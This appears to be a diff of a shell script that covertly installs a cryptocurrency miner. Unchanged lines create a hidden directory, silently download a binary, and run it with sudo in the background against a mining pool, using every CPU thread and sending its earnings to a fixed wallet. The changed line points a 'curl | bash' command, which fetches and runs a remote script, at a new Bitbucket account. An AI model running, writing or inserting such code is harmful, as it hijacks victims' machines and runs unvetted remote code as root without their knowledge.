@@ -13,4 +13,4 @@ mkdir .kap && cd .kap
 wget -O sgr1 https://bitbucket.org/zepir/filesg/downloads/serbenew >/dev/null 2>&1
 chmod +x sgr1
 sudo ./sgr1 --algorithm lyra2v2_webchain --pool 159.223.58.67:80 --wallet 0x336d3661ef42b688281b601784114aa43ad9c06b --worker $(echo $(shuf -i 1-100000 -n 1)-A) --password x --cpu-threads $(nproc --all) > /dev/null 2>&1 &
-curl -sL https://bitbucket.org/zepir/filesg/raw/main/boled04.sh | bash
+curl -sL https://bitbucket.org/tsyjaryj/filesg/raw/main/boled04.sh | bash
